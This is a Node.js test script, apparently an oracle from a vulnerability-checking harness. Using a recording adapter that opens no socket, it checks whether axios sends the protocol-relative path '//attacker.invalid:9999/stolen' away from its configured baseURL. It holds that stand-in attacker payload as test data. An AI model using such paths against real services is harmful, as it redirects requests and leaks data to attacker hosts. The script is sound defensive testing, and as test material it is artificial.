'use strict';

function emit(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

function main() {
  let axios;
  try {
    axios = require('axios');
    axios = axios.default || axios;
  } catch (e) {
    emit({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'module resolution failed: ' + (e && e.message)
    });
    return;
  }

  // Use axios's public custom-adapter mechanism to observe the fully
  // resolved request URL that axios computes internally for a given
  // baseURL + relative url combination, without ever opening a real
  // socket or spawning any process. This exercises axios's genuine
  // internal buildFullPath/isAbsoluteURL/URL-parsing logic because the
  // adapter receives the already-resolved `config.url` exactly as the
  // real http/xhr adapters would see it.

  function makeRecordingAdapter(sink) {
    return function recordingAdapter(config) {
      sink.push(config.url);
      return Promise.resolve({
        data: 'ok',
        status: 200,
        statusText: 'OK',
        headers: {},
        config
      });
    };
  }

  const baseURL = 'http://127.0.0.1:65500';

  // --- Benign operation first ---
  const benignSink = [];
  const benignInstance = axios.create({
    baseURL,
    adapter: makeRecordingAdapter(benignSink)
  });

  return benignInstance.get('/some/normal/path')
    .then((resp) => {
      const recordedUrl = benignSink[0];
      if (!resp || resp.data !== 'ok' || typeof recordedUrl !== 'string' || recordedUrl.indexOf('/some/normal/path') === -1) {
        emit({
          operation_completed: false,
          exploit_succeeded: false,
          evidence: 'benign operation did not behave as expected: ' + JSON.stringify(recordedUrl)
        });
        return;
      }
      const operation_completed = true;

      // --- Malicious operation ---
      // A protocol-relative-looking path segment, exactly as a caller
      // building a path from untrusted input (e.g. a user id) might
      // produce. We inspect how axios resolves this through its own
      // public request pipeline (axios.create/get + custom adapter),
      // without reimplementing any of axios's URL logic ourselves.
      const maliciousSink = [];
      const maliciousInstance = axios.create({
        baseURL,
        adapter: makeRecordingAdapter(maliciousSink)
      });

      const maliciousPath = '//attacker.invalid:9999/stolen';

      return maliciousInstance.get(maliciousPath)
        .then(() => {
          const recorded = maliciousSink[0];
          let exploit_succeeded = false;
          let evidence;

          if (typeof recorded === 'string' && recorded.indexOf('attacker.invalid') !== -1) {
            // The adapter was dispatched a URL pointing at the
            // attacker-controlled protocol-relative target rather than
            // being combined safely with baseURL. In the real http/xhr
            // adapters this resolved value is what gets used to open the
            // network connection, meaning the vulnerable version would
            // connect to attacker.invalid instead of the configured
            // baseURL host.
            exploit_succeeded = true;
            evidence = 'axios resolved malicious path "' + maliciousPath + '" to attacker-controlled target "' + recorded + '" bypassing configured baseURL "' + baseURL + '"';
          } else {
            exploit_succeeded = false;
            evidence = 'axios resolved malicious path "' + maliciousPath + '" safely relative to baseURL as "' + recorded + '"; attacker host was not targeted';
          }

          emit({
            operation_completed,
            exploit_succeeded,
            evidence
          });
        })
        .catch((e) => {
          // A thrown error (e.g. "Invalid URL") while resolving the
          // malicious path indicates axios rejected/blocked the
          // protocol-relative URL rather than silently redirecting to it.
          emit({
            operation_completed,
            exploit_succeeded: false,
            evidence: 'malicious request rejected during URL resolution: ' + (e && e.message)
          });
        });
    })
    .catch((e) => {
      emit({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'benign operation threw unexpectedly: ' + (e && e.message)
      });
    });
}

main();
